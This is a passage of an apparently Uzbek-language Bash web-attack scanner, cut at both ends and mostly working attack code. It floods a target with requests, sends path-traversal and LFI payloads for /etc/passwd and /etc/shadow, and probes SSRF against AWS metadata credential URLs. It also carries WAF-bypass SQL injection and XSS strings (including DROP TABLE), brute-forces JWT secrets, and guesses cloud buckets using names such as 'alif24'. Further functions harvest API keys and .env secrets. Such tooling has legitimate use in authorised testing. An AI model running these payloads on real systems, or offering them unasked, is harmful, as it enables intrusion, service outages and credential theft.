        local ab_result=$(ab -n "$total_requests" -c "$concurrent" -s 10 "${TARGET}/" 2>/dev/null)

        local rps=$(echo "$ab_result" | grep "Requests per second" | awk '{print $4}')
        local time_per=$(echo "$ab_result" | grep "Time per request" | head -1 | awk '{print $4}')
        local failed=$(echo "$ab_result" | grep "Failed requests" | awk '{print $3}')
        local time_taken=$(echo "$ab_result" | grep "Time taken" | awk '{print $4}')

        info "Sorovlar/sek: ${rps:-0}"
        info "O'rt. javob vaqti: ${time_per:-0} ms"
        info "Jami vaqt: ${time_taken:-?} sek"

        if [ -n "$failed" ] && [ "$failed" -gt 0 ]; then
            warning "Stress test davomida $failed ta sorov muvaffaqiyatsiz bo'ldi"
        else
            pass "Barcha sorovlar muvaffaqiyatli qaytdi"
        fi
    else
        echo -e "  ${BOLD}1. curl bilan parallel stress test:${NC}"
        local fail_count=0
        local ok_count=0
        local total_requests=$REQ_COUNT
        local concurrent=50
        [ "$concurrent" -gt "$total_requests" ] && concurrent=$total_requests
        local start_time=$(date +%s)

        for i in $(seq 1 "$total_requests"); do
            curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$TARGET/" 2>/dev/null &
            if [ $((i % concurrent)) -eq 0 ]; then
                wait
            fi
        done
        wait

        local end_time=$(date +%s)
        local dur=$((end_time - start_time))
        info "${total_requests} ta sorov ${dur} sekundda yakunlandi"
    fi

    # Server response after stress
    separator
    echo -e "  ${BOLD}2. Stress dan keyin server holati:${NC}"
    sleep 2
    local code=$(curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$TARGET/" 2>/dev/null)
    local time=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" "$TARGET/" 2>/dev/null)

    if [ "$code" = "200" ]; then
        pass "Server tirik! HTTP $code, javob vaqti: ${time}s"
    elif [ "$code" = "503" ] || [ "$code" = "502" ]; then
        vuln "Server YIQILDI! HTTP $code â€” DDoS hujumiga chidami YOQ!"
    else
        warning "Server javob berdi: HTTP $code - ${time}s"
    fi
}

# ================================================================
# 10. API â€” API Fuzzing (Notogri Malumotlar)
# ================================================================
cmd_api() {
    header "API FUZZING TEKSHIRUVI â€” $TARGET"
    echo ""

    # Notogri metodlar
    echo -e "  ${BOLD}1. HTTP Method Tampering:${NC}"
    local methods=("DELETE" "PUT" "PATCH" "OPTIONS" "TRACE" "CONNECT")
    for method in "${methods[@]}"; do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" -X "$method" "${TARGET}/" 2>/dev/null)
        if [ "$code" = "200" ]; then
            if [ "$method" = "TRACE" ] || [ "$method" = "CONNECT" ]; then
                vuln "Xavfli method ochiq: $method - HTTP $code"
            else
                warning "$method method yoqilgan: HTTP $code"
            fi
        fi
    done

    # Katta payload
    separator
    echo -e "  ${BOLD}2. Oversized Payload - Body hajmi bomba:${NC}"
    local big_payload=$(python3 -c "print('A'*10000)" 2>/dev/null || echo "AAAAAAAAAA")
    local code=$(curl -sk --max-time 10 -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"data\":\"$big_payload\"}" 2>/dev/null)

    if [ "$code" = "413" ] || [ "$code" = "400" ]; then
        pass "Katta payload bloklandi - HTTP $code"
    elif [ "$code" = "200" ]; then
        vuln "Katta payload QABUL QILINDI! Memory exhaustion hujumiga ochiq."
    else
        info "Server javob: HTTP $code"
    fi

    # Path traversal
    separator
    echo -e "  ${BOLD}3. Path Traversal (Fayl o'qish hujumi):${NC}"
    local traversals=(
        "/../../../etc/passwd"
        "/..%2f..%2f..%2fetc/passwd"
        "/api/v1/../../etc/passwd"
        "/static/../../../etc/shadow"
    )
    for path in "${traversals[@]}"; do
        local body=$(curl -sk --max-time 5 "$TARGET$path" 2>/dev/null)
        if echo "$body" | grep -qE "root:|/bin/bash|nobody"; then
            vuln "PATH TRAVERSAL ZAIFLIK: $path da server fayllari oqiladi!"
        fi
    done
    pass "Path Traversal tekshiruvlari yakunlandi"

    # SSRF
    separator
    echo -e "  ${BOLD}4. SSRF (Server-Side Request Forgery):${NC}"
    local ssrf_targets=(
        "http://127.0.0.1:5432"
        "http://localhost:6379"
        "http://169.254.169.254/latest/meta-data/"
    )
    for ssrf_url in "${ssrf_targets[@]}"; do
        local body=$(curl -sk --max-time 5 \
            -X POST "$TARGET/api/v1/health/ping" \
            -H "Content-Type: application/json" \
            -d "{\"url\":\"$ssrf_url\"}" 2>/dev/null)
        if echo "$body" | grep -qE "ami-|instance-id|PostgreSQL|PONG|Redis"; then
            vuln "SSRF Zaiflik! Server ichki xizmatga sorov yubordi: $ssrf_url"
        fi
    done
    pass "SSRF tekshiruvlari yakunlandi"

    # Open Redirect
    separator
    echo -e "  ${BOLD}5. Open Redirect:${NC}"
    local redirect_resp=$(curl -sk --max-time 5 -o /dev/null -w "%{redirect_url}" "$TARGET/api/v1/auth/login?next=https://evil.com" 2>/dev/null)
    if echo "$redirect_resp" | grep -q "evil.com"; then
        vuln "OPEN REDIRECT zaiflik: Foydalanuvchi evil.com ga yo'naltirilishi mumkin!"
    else
        pass "Open Redirect zaiflik topilmadi"
    fi
}

# ================================================================
# 11. SMARTDIRS - Smart Directory Scanner (False Positive Filter)
# ================================================================
cmd_smartdirs() {
    header "SMART DIRECTORY SCANNER - False Positive Filter"
    echo ""

    # Avval mavjud bolmagan sahifa hajmini olish (baseline)
    local baseline_size=$(curl -sk --max-time 5 -o /dev/null -w "%{size_download}" "${TARGET}/this_page_does_not_exist_xyz123" 2>/dev/null)
    info "Baseline hajm (SPA fallback): ${baseline_size} bayt"
    echo ""

    local critical_paths=(
        "/.env"
        "/.git/config"
        "/.git/HEAD"
        "/docker-compose.yml"
        "/Dockerfile"
        "/requirements.txt"
        "/backup.sql"
        "/dump.sql"
        "/db.sqlite3"
        "/.htpasswd"
        "/wp-config.php"
        "/config.php"
        "/phpinfo.php"
        "/debug.log"
        "/swagger.json"
        "/openapi.json"
    )

    echo -e "  ${BOLD}Haqiqiy fayllarni aniqlash (SPA filterlash):${NC}"
    for path in "${critical_paths[@]}"; do
        local resp_size=$(curl -sk --max-time 5 -o /dev/null -w "%{size_download}" "${TARGET}${path}" 2>/dev/null)
        local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "${TARGET}${path}" 2>/dev/null)

        if [ "$code" = "200" ]; then
            # Agar fayl hajmi SPA fallback dan 50+ bayt farq qilsa => haqiqiy fayl
            local diff=$((resp_size - baseline_size))
            if [ "$diff" -gt 50 ] 2>/dev/null || [ "$diff" -lt -50 ] 2>/dev/null; then
                vuln "HAQIQIY FAYL OCHIQ: ${path} - ${resp_size} bayt (farq: ${diff})"
            else
                pass "${path} - SPA fallback (false positive, ${resp_size} bayt)"
            fi
        elif [ "$code" = "403" ]; then
            pass "${path} - bloklangan"
        elif [ "$code" != "000" ]; then
            info "${path} - HTTP $code"
        fi
    done
}

# ================================================================
# 12. TAKEOVER - Subdomain Takeover Scanner
# ================================================================
cmd_takeover() {
    header "SUBDOMAIN TAKEOVER SCANNER"
    echo ""

    echo -e "  ${BOLD}Subdomain DNS va Takeover tekshiruvi:${NC}"
    for sub in "${SUBDOMAINS[@]}"; do
        local fqdn="${sub}.${DOMAIN}"
        local cname=$(dig +short CNAME "$fqdn" 2>/dev/null | head -1)
        local ip=$(dig +short A "$fqdn" 2>/dev/null | head -1)
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://$fqdn" 2>/dev/null)

        if [ -n "$cname" ]; then
            # CNAME bor - Takeover xavfi tekshiriladi
            local cname_resolves=$(dig +short A "$cname" 2>/dev/null | head -1)
            if [ -z "$cname_resolves" ]; then
                vuln "TAKEOVER XAVF: $fqdn -> CNAME: $cname (CNAME resolve bolmayapti = sahipsiz!)"
            else
                info "$fqdn -> CNAME: $cname (tirik)"
            fi
        elif [ -n "$ip" ]; then
            if [ "$code" = "000" ]; then
                warning "$fqdn - DNS bor ($ip) lekin server javob bermayapti"
            else
                info "$fqdn - $ip - HTTP $code"
            fi
        fi
    done
}

# ================================================================
# 13. WAFBYPASS - WAF Bypass SQL/XSS Evasion
# ================================================================
cmd_wafbypass() {
    header "WAF BYPASS - Ilgor SQL/XSS Evasion Tekshiruvi"
    echo ""

    local endpoints=(
        "/api/v1/auth/login"
        "/api/v1/users/"
        "/api/v1/search"
    )

    # Double Encoding SQLi
    echo -e "  ${BOLD}1. Double-Encoded SQL Injection:${NC}"
    local encoded_payloads=(
        "%2527%2520OR%25201%253D1--"
        "%252d%252d"
        "%2527%2520UNION%2520SELECT%2520null%252Cnull--"
    )
    for ep in "${endpoints[@]}"; do
        for payload in "${encoded_payloads[@]}"; do
            local body=$(curl -sk --max-time 5 "${TARGET}${ep}?q=${payload}" 2>/dev/null)
            if echo "$body" | grep -qiE "sql|syntax|postgresql|error|column"; then
                vuln "WAF BYPASS SQLi: $ep - Double-encoded payload otib ketdi!"
                echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}'\%2527\%2520OR' deb URL Encoded 2 marta qilib SQL xato chiqarildi. WAF buning asil mantig'ini o'qiy olmadi.${NC}"
            fi
        done
    done
    pass "Double-encoded SQLi WAF bypass tekshirildi"

    # Unicode XSS
    separator
    echo -e "  ${BOLD}2. Unicode XSS Bypass:${NC}"
    local unicode_xss=(
        "%EF%BC%9Cscript%EF%BC%9Ealert%EF%BC%881%EF%BC%89%EF%BC%9C/script%EF%BC%9E"
        "%u003Cscript%u003Ealert%u00281%u0029%u003C/script%u003E"
        "%22%3E%3Csvg%20onload%3Dalert%281%29%3E"
    )
    for ep in "${endpoints[@]}"; do
        for payload in "${unicode_xss[@]}"; do
            local body=$(curl -sk --max-time 5 "${TARGET}${ep}?q=${payload}" 2>/dev/null)
            if echo "$body" | grep -qiE "<script>|<svg|onerror|onload|alert"; then
                vuln "WAF BYPASS XSS: $ep - Unicode payload aks ettirildi!"
            fi
        done
    done
    pass "Unicode XSS WAF bypass tekshirildi"

    # Case Variation SQLi
    separator
    echo -e "  ${BOLD}3. Case Variation SQLi:${NC}"
    local case_payloads=(
        "1 oR 1=1"
        "1 UnIoN SeLeCt null,null--"
        "1; DrOp TaBlE users--"
    )
    for ep in "${endpoints[@]}"; do
        for payload in "${case_payloads[@]}"; do
            local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
                -X POST "${TARGET}${ep}" \
                -H "Content-Type: application/json" \
                -d "{\"q\":\"$payload\"}" 2>/dev/null)
            if [ "$code" = "500" ]; then
                vuln "WAF BYPASS: Case variation SQLi $ep da 500 xato chiqardi!"
            fi
        done
    done
    pass "Case variation SQLi tekshirildi"

    # Comment Injection
    separator
    echo -e "  ${BOLD}4. Comment-Based SQLi:${NC}"
    local comment_payloads=(
        "1/**/OR/**/1=1"
        "1'/*!50000OR*/1=1--"
    )
    for ep in "${endpoints[@]}"; do
        for payload in "${comment_payloads[@]}"; do
            local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
                -X POST "${TARGET}${ep}" \
                -H "Content-Type: application/json" \
                -d "{\"q\":\"$payload\"}" 2>/dev/null)
            if [ "$code" = "500" ]; then
                vuln "WAF BYPASS: Comment SQLi $ep da 500 xato!"
            fi
        done
    done
    pass "Comment-based SQLi tekshirildi"
}

# ================================================================
# 14. IDOR - Insecure Direct Object Reference
# ================================================================
cmd_idor() {
    header "IDOR - Boshqa foydalanuvchi malumotlariga ruxsatsiz kirish"
    echo ""

    local id_endpoints=(
        "/api/v1/users/1"
        "/api/v1/users/2"
        "/api/v1/users/3"
        "/api/v1/courses/1"
        "/api/v1/courses/2"
        "/api/v1/students/1"
        "/api/v1/students/2"
    )

    echo -e "  ${BOLD}1. Autentifikatsiyasiz ID bilan malumot olish:${NC}"
    for ep in "${id_endpoints[@]}"; do
        local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "${TARGET}${ep}" 2>/dev/null)
        local body=$(curl -sk --max-time 5 "${TARGET}${ep}" 2>/dev/null)

        if [ "$code" = "200" ]; then
            if echo "$body" | grep -qiE "email|phone|password|name|username|first_name"; then
                vuln "IDOR zaiflik: ${ep} - autentifikatsiyasiz kirdi!"
                # Isbot uchun body ni formatlab qisqacha chiqarish (max 200 belgi)
                local proof=$(echo "$body" | tr -d '\n\r' | head -c 200)
                echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}${proof}...${NC}"
            else
                warning "${ep} - HTTP 200 qaytdi, ammo shaxsiy malumot topilmadi"
            fi
        elif [ "$code" = "401" ] || [ "$code" = "403" ]; then
            pass "${ep} - himoyalangan - HTTP $code"
        else
            info "${ep} - HTTP $code"
        fi
    done

    # UUID IDOR
    separator
    echo -e "  ${BOLD}2. Sequential ID Enumeration:${NC}"
    local prev_size=0
    local same_count=0
    for i in $(seq 1 10); do
        local size=$(curl -sk --max-time 3 -o /dev/null -w "%{size_download}" "${TARGET}/api/v1/users/$i" 2>/dev/null)
        if [ "$size" = "$prev_size" ] && [ "$size" -gt 0 ] 2>/dev/null; then
            same_count=$((same_count + 1))
        fi
        prev_size=$size
    done
    if [ "$same_count" -ge 5 ]; then
        pass "Sequential ID enumeration ishlamaydi (bir xil javoblar)"
    else
        warning "Sequential ID enumeration mumkin (turli javob hajmlari aniqlangan)"
    fi
}

# ================================================================
# 15. TIMING - Response Time Analysis (Timing Attack)
# ================================================================
cmd_timing() {
    header "TIMING ATTACK - Javob Vaqti Tahlili"
    echo ""

    echo -e "  ${BOLD}1. User Enumeration via Timing:${NC}"
    # Mavjud bolmagan foydalanuvchi
    local time_fake=0
    for i in $(seq 1 3); do
        local t=$(curl -sk --max-time 5 -o /dev/null -w "%{time_total}" \
            -X POST "${TARGET}/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"nonexistent_user_xyz_12345","password":"wrong"}' 2>/dev/null)
        time_fake=$(echo "$time_fake + $t" | bc 2>/dev/null || echo "0")
    done
    local avg_fake=$(echo "scale=4; $time_fake / 3" | bc 2>/dev/null || echo "0")

    # Admin foydalanuvchi
    local time_admin=0
    for i in $(seq 1 3); do
        local t=$(curl -sk --max-time 5 -o /dev/null -w "%{time_total}" \
            -X POST "${TARGET}/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"admin","password":"wrong"}' 2>/dev/null)
        time_admin=$(echo "$time_admin + $t" | bc 2>/dev/null || echo "0")
    done
    local avg_admin=$(echo "scale=4; $time_admin / 3" | bc 2>/dev/null || echo "0")

    info "Mavjud emas user: ${avg_fake}s | Admin user: ${avg_admin}s"

    local diff=$(echo "scale=4; $avg_admin - $avg_fake" | bc 2>/dev/null || echo "0")
    local abs_diff=$(echo "$diff" | tr -d '-')

    if [ "$(echo "$abs_diff > 0.1" | bc 2>/dev/null)" = "1" ]; then
        vuln "TIMING ATTACK: Javob vaqtlari orasida ${abs_diff}s farq! Haker foydalanuvchi bor-yoqligini bilishi mumkin."
    else
        pass "Timing attack himoyalangan - farq: ${abs_diff}s"
    fi

    # Password complexity timing
    separator
    echo -e "  ${BOLD}2. Password Hashing Timing:${NC}"
    local time_short=$(curl -sk --max-time 5 -o /dev/null -w "%{time_total}" \
        -X POST "${TARGET}/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"a"}' 2>/dev/null)
    local time_long=$(curl -sk --max-time 5 -o /dev/null -w "%{time_total}" \
        -X POST "${TARGET}/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}' 2>/dev/null)

    info "Qisqa parol: ${time_short}s | Uzun parol: ${time_long}s"
    local pwd_diff=$(echo "scale=4; $time_long - $time_short" | bc 2>/dev/null || echo "0")
    local abs_pwd=$(echo "$pwd_diff" | tr -d '-')
    if [ "$(echo "$abs_pwd > 0.2" | bc 2>/dev/null)" = "1" ]; then
        warning "Parol uzunligi timing farqi aniqlangan: ${abs_pwd}s"
    else
        pass "Parol hashing timing xavfsiz"
    fi
}

# ================================================================
# 16. LOGIC - Business Logic Flaws (Narx manipulyatsiyasi)
# ================================================================
cmd_logic() {
    header "BUSINESS LOGIC FLAWS - Moliyaviy tizim xatolari"
    echo ""

    local endpoints=(
        "/api/v1/payments"
        "/api/v1/checkout"
        "/api/v1/transfer"
        "/api/v1/cart"
        "/api/v1/orders"
    )

    echo -e "  ${BOLD}1. Negativ va Nol Summalar (Price Tampering):${NC}"
    local payloads=(
        '{"amount": -100, "price": 0.00, "qty": -1}'
        '{"amount": 999999999999999, "currency": "UZS"}'
        '{"price": "free", "discount": 100}'
    )

    for ep in "${endpoints[@]}"; do
        for payload in "${payloads[@]}"; do
            local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
                -X POST "${TARGET}${ep}" \
                -H "Content-Type: application/json" \
                -d "$payload" 2>/dev/null)
            
            # Agar 200 yoki 201 qaytarsa vahima
            if [ "$code" = "200" ] || [ "$code" = "201" ]; then
                vuln "BUSINESS LOGIC ZAIFLIK: ${ep} da mantiqiy xato qabul qilindi!"
                echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Biz atayin '$payload' yubordik (Minus pul yoki nol), server uni 400 xato bilan qaytarish orniga HTTP $code QABUL QILDI! Xaker o'ziga bepul pul o'tkazishi mumkin.${NC}"
            elif [ "$code" = "500" ]; then
                warning "Mantiqiy xato ${ep} ni yiqitdi (HTTP 500). Valudatsiya yoq."
            else
                info "${ep} xavfsiz (HTTP $code) - payload: $payload"
            fi
        done
    done
}

# ================================================================
# 17. PORTS - Ochiq qolib ketgan infratuzilma portlari
# ================================================================
cmd_ports() {
    header "INFRASTRUCTURE PORT SCANNER - DevOps Xatolari"
    echo ""

    # Eng kop hacking qilanadigna portlar
    local ports=(
        "21:FTP" "22:SSH" "23:Telnet"
        "3306:MySQL" "5432:PostgreSQL" 
        "6379:Redis" "27017:MongoDB" 
        "9200:Elasticsearch" "11211:Memcached"
        "8080:Dev-Tomcat" "3000:Dev-Node"
    )

    echo -e "  ${BOLD}Server (${DOMAIN}) da ochiq qolgan xizmatlarni qidirish:${NC}"
    for p_info in "${ports[@]}"; do
        local port="${p_info%%:*}"
        local name="${p_info##*:}"
        
        # Bash tcp port tekshiruv usuli (agar nc ishlamasa fallback)
        (echo >/dev/tcp/$DOMAIN/$port) &>/dev/null
        if [ $? -eq 0 ]; then
            vuln "XAVFLI PORT OCHIQ: Port $port ($name) ochiq qolib ketgan!"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Biz tashqi internetdan serverning '$port' portiga ulandik va javob oldik. Ma'lumotlar bazasi yoki ichki DevOps asboblari hammaga ochiq.${NC}"
        else
            pass "Port $port ($name) yopiq/xavfsiz"
        fi
    done
}

# ================================================================
# 18. CLOUD - AWS S3 / Firebase Data Leak Scanner
# ================================================================
cmd_cloud() {
    header "CLOUD BUCKET SCANNER - Ochiq saqlagichlar"
    echo ""

    local company_names=("$DOMAIN" "${DOMAIN%%.*}" "alif24" "alif" "harf" "fintech" "static-${DOMAIN%%.*}")

    echo -e "  ${BOLD}1. AWS S3 Bucket Leakage:${NC}"
    for cname in "${company_names[@]}"; do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://${cname}.s3.amazonaws.com" 2>/dev/null)
        if [ "$code" = "200" ]; then
            vuln "BOMBA ZAIFLIK: AWS S3 Bucket OCHIQ! (https://${cname}.s3.amazonaws.com)"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Bu manzilda kompaniyaning barcha fayllari, pasportlar yoxud loglar hammaga korinib turibdi!${NC}"
        fi
    done
    pass "AWS S3 tekshiruvi tugadi"

    echo -e "  ${BOLD}2. Firebase Realtime Database Leakage:${NC}"
    for cname in "${company_names[@]}"; do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://${cname}.firebaseio.com/.json" 2>/dev/null)
        if [ "$code" = "200" ]; then
            vuln "BOMBA ZAIFLIK: Firebase DB OCHIQ! (https://${cname}.firebaseio.com/.json)"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Firebase dagi user ma'lumotlari shifrlanmagan va autenfikatsiyasiz JSON oqish mumkin!${NC}"
        fi
    done
    pass "Firebase tekshiruvi tugadi"
}

# ================================================================
# 19. JWT_CRACK - Offline JWT Secret Brute-forcer
# ================================================================
cmd_jwt_crack() {
    header "LOCAL JWT OFFLINE CRACKER"
    echo ""

    echo -e "  ${BOLD}1. JWT Token qidirish...${NC}"
    local dummy_jwt=""
    local login_resp=$(curl -sk --max-time 5 -X POST "$TARGET/api/v1/auth/login" -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"wrong_pass_for_test\"}" 2>/dev/null)
    
    dummy_jwt=$(echo "$login_resp" | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | head -1)

    if [ -z "$dummy_jwt" ]; then
        warning "Saytdan avtomatik ommaviy API da JWT topilmadi."
        echo -e "       ${YELLOW}â†³ ISBOT:${NC} ${DIM}Crack qilish uchun bizga haqiqiy tizim tokeni kerak. Demak login dan tashqari yashirin marshrut bor.${NC}"
        return
    fi
    
    info "Token topildi: ${dummy_jwt:0:20}..."
    echo -e "  ${BOLD}2. Python HMAC bilan zaif kalitlarni crack qilish:${NC}"
    
    python3 -c "
import hmac, hashlib, base64, sys
token = '$dummy_jwt'
parts = token.split('.')
if len(parts) != 3:
    print('Noto\'g\'ri token formati')
    sys.exit()

message = parts[0] + '.' + parts[1]
signature = parts[2]

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

# Keng tarqalgan juda zaif kalitlar
common_secrets = ['secret', '123456', 'password', 'admin', 'key', 'secretkey', 'alif24', 'test', 'dev', '123456789']

print('  Dikshionari (Lug\\'at) bazasi: ' + str(len(common_secrets)) + ' ta kop ishlatiladigan parol shifrlanmoqda...')

cracked = False
for secret in common_secrets:
    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    sig_b64 = base64url_encode(sig)
    
    if sig_b64 == signature:
         print('\n  ğŸš¨ ZAIFLIK: JWT Secret Key BUZILDI!')
         print('       ğŸ”´ ISBOT: Olingan Token haqiqatdan ham eng sodda \"' + secret + '\" degan so\\'z bilan shifrlangan ekan. Istalgan haker ozini Admin qilib soxta token yasay oladi!')
         cracked = True
         break

if not cracked:
    print('\n  âœ… XAVFSIZ: Token kaliti murakkab himoyalangan. Oddiy lug\\'at asosida buzish imkonsiz.')
"
}

# ================================================================
# 20. GRAPHQL - GraphQL API Introspection Dumping
# ================================================================
cmd_graphql() {
    header "GRAPHQL INTROSPECTION - API larni to'liq fosh qilish"
    echo ""

    local endpoints=("/graphql" "/api/graphql" "/v1/graphql" "/v2/graphql")
    local payload='{"query":"\n    # IntrospectionQuery\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n        types {\n          ...FullType\n        }\n      }\n    }\n    \n    fragment FullType on __Type {\n      kind\n      name\n      fields(includeDeprecated: true) {\n        name\n      }\n    }\n  "}'

    echo -e "  ${BOLD}1. GraphQL Yashirin Sxemasini (Schema) qidirish...${NC}"
    for ep in "${endpoints[@]}"; do
        local body=$(curl -sk --max-time 5 -X POST "${TARGET}${ep}" -H "Content-Type: application/json" -d "$payload" 2>/dev/null)
        
        if echo "$body" | grep -qiE "__schema"; then
            vuln "BOMBA ZAIFLIK: GraphQL Introspection OCHIQ! (${TARGET}${ep})"
            local first_type=$(echo "$body" | grep -o '"name":"[^"]*"' | head -5 | tr '\n' ' ')
            echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Server GraphQL da yozilgan va O'ZINING BARCHA API API/JADVAL NOMLARINI BIZGA BERDI! \n       Ko'rinish: ${first_type}...${NC}"
            break
        fi
    done
    pass "GraphQL tekshirildi."
}

# ================================================================
# 21. LFI - Local File Inclusion (Server fayllarini o'qish)
# ================================================================
cmd_lfi() {
    header "LOCAL FILE INCLUSION (LFI) - Parollarni o'qish"
    echo ""

    # Eng ommabop API pathlaridan LFI fuzzing qidiramiz
    local lfi_payloads=(
        "../../../../../../../../etc/passwd"
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    )
    
    # Bazali URL larni olamiz
    local endpoints=("/api/v1/download?file=" "/image?url=" "/file?path=" "/download?file=")

    echo -e "  ${BOLD}1. LFI Fuzzing (/etc/passwd) qidirilmoqda...${NC}"
    for ep in "${endpoints[@]}"; do
        for payload in "${lfi_payloads[@]}"; do
            local body=$(curl -sk --max-time 5 "${TARGET}${ep}${payload}" 2>/dev/null)
            if echo "$body" | grep -qiE "root:x:0:0"; then
                vuln "O'TA JIDDIY XAVF: LFI Zaifligi topildi! (${TARGET}${ep})"
                local proof=$(echo "$body" | grep -iE "root:x:0:0|bin/bash" | head -2)
                echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Biz server operatsion tizimidagi (Linux) ichki '/etc/passwd' foydalanuvchilar faylini api orqali o'qib oldik! \n       ${proof}${NC}"
                return
            fi
        done
    done
    pass "LFI / Yashirin parollar o'qilmadi."
}

# ================================================================
# 22. SSRF AWS - Amazon Cloud Metadata Extraction
# ================================================================
cmd_ssrf_aws() {
    header "SSRF AWS METADATA - Bulut kalitini o'g'irlash"
    echo ""

    local amazon_ip="169.254.169.254"
    local ssrf_urls=(
        "/api/v1/proxy?url=http://${amazon_ip}/latest/meta-data/"
        "/api/v1/webhook?url=http://${amazon_ip}/latest/meta-data/iam/security-credentials/"
        "/fetch?url=http://${amazon_ip}/latest/meta-data/"
    )

    echo -e "  ${BOLD}1. AWS Metadata orqali Coud Server API Key sini qidirish...${NC}"
    for ep in "${ssrf_urls[@]}"; do
        local body=$(curl -sk --max-time 5 "${TARGET}${ep}" 2>/dev/null)
        if echo "$body" | grep -qiE "ami-id|instance-id|security-credentials"; then
            vuln "BOMBA ZAIFLIK: AWS SSRF Zaifligi topildi! (${TARGET}${ep})"
            echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Server atayin '169.254.169.254' ga, ya'ni Amazon ning ichki maxfiy serveriga kirishga ruxsat berdi, endi AWS Root kalitlarini bitta xakerlik qitish bilan olsa bo'ladi!${NC}"
            return
        fi
    done
    pass "AWS Metadata xujumidan himoyalangan."
}

# ================================================================
# 23. JS SECRETS - JavaScript API kalit o'g'irlash (Magia)
# ================================================================
cmd_js_secrets() {
    header "JS SECRETS EXTRACTOR - Front-End parollarini izlash"
    echo ""

    echo -e "  ${BOLD}1. Sayt yuzidagi barcha JavaScript kutubxonalari tahlil qilinmoqda...${NC}"
    
    # 1. Barcha script teglaridan main js fayllarni tortamiz
    local html=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
    local js_links=$(echo "$html" | grep -oIE 'src="[^"]*\.js"' | cut -d '"' -f 2)

    if [ -z "$js_links" ]; then
        warning "Hech qanday .js manbalari topilmadi."
        return
    fi

    local secrets_found=false
    for js in $js_links; do
        # agar js toliq URL bolmasa uni togirlab olamiz
        if ! echo "$js" | grep -q "^http"; then
            if echo "$js" | grep -q "^/"; then
                js="${TARGET}${js}"
            else
                js="${TARGET}/${js}"
            fi
        fi

        echo -e "  ${DIM}Tahlil: ${js}${NC}"
        # FAYLNI OQIYMIZ VA SIRNI (API_KEY, PASSWORD, TOKEN) QIDIRAMIZ
        local js_code=$(curl -sk --max-time 5 "$js" 2>/dev/null)
        local results=$(echo "$js_code" | grep -iEo '("|\047)(api[_-]?key|secret|password|access[_-]?token|auth[_-]?token)("|\047)\s*:\s*("|\047)[A-Za-z0-9_=-]+("|\047)')
        
        if [ -n "$results" ]; then
            vuln "BOMBA: ${js} faylida qolib ketgan SIRLI KALIT (API_KEY) topildi!"
            local clean=$(echo "$results" | head -n 3 | tr '\n' ' | ')
            echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Dasturchining ahmoqligi: Front-end (React/Vue/Angular) kodlarida hardcoded holda ushbu sirlar qolib ketgan - [ ${clean} ]${NC}"
            secrets_found=true
        fi
        
        # Google Maps Key qidiruvi
        local maps=$(echo "$js_code" | grep -iEo 'AIza[0-9A-Za-z_-]{35}')
        if [ -n "$maps" ]; then
            vuln "BOMBA: Google Maps API/Firebase Key .js faylda oshkor qilingan!"
            local clean=$(echo "$maps" | head -n 1)
            echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Kompaniyaning pullik kreditlari o'g'irlanishi mumkin: ${clean}${NC}"
            secrets_found=true
        fi
    done

    if [ "$secrets_found" = false ]; then
        pass "Barcha topilgan JS fayllar ichidan hech qanday parollar chiqmadi."
    fi
}

# ================================================================
# 24. ENV LEAK - Server Yuragidan (.env) parollarni sug'urish
# ================================================================
cmd_env() {
    header "ENV LEAK - Bazani (Postgres) va API parollarini o'g'irlash"
    echo ""

    local env_files=(".env" ".env.production" ".env.backup" ".env.bak" ".env.dev" ".env.local" "config.js" "docker-compose.yml" "config.php.bak")

    echo -e "  ${BOLD}1. Server asbob-uskunalaridan konfiguratsiyalarni tahlil qilish...${NC}"
    for file in "${env_files[@]}"; do
        local ep="/${file}"
        local body=$(curl -sk --max-time 5 "${TARGET}${ep}" 2>/dev/null)
        
        # Odatda DB_PASSWORD yoki JWT_SECRET kabi narsalar boladi env da
        if echo "$body" | grep -qiE "DB_PASS|DB_USER|DATABASE_URL|JWT_SECRET|AWS_ACCESS_KEY|REDIS_PASSWORD"; then
            vuln "QIYOMAT ZAIFLIK: Server ${ep} faylini butun dunyoga ochiq qoldirgan! (${TARGET}${ep})"
